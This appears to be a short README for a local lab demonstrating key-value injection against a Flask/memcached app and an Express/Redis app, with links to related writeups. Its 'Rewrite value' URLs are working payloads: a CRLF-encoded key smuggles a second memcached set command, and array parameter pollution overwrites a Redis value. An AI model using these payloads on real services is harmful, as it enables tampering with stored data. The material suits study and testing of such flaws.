Flask - memcached

Set default value - http://127.0.0.1:8800/api/set?key=pewpew

Get value - http://127.0.0.1:8800/api/get?key=pewpew

Rewrite value - http://127.0.0.1:8800/api/set?key=a%0d%0a1%0d%0aset%20pewpew%200%203600%205%0d%0apwned%0d%0a

Express - Redis

Set default value - http://127.0.0.1:8801/query?key=pewpew

Get value - http://127.0.0.1:8801/?key=pewpew

Rewrite value - http://127.0.0.1:8801/query?key[]=pewpew&key[]=pwned




https://medium.com/@d0znpp/ssrf-memcached-and-other-key-value-injections-in-the-wild-c8d223bd856f
https://www.exploit-db.com/exploits/37815
https://medium.com/@PatrickSpiegel/https-medium-com-patrickspiegel-nosql-injection-redis-25b332d09e58
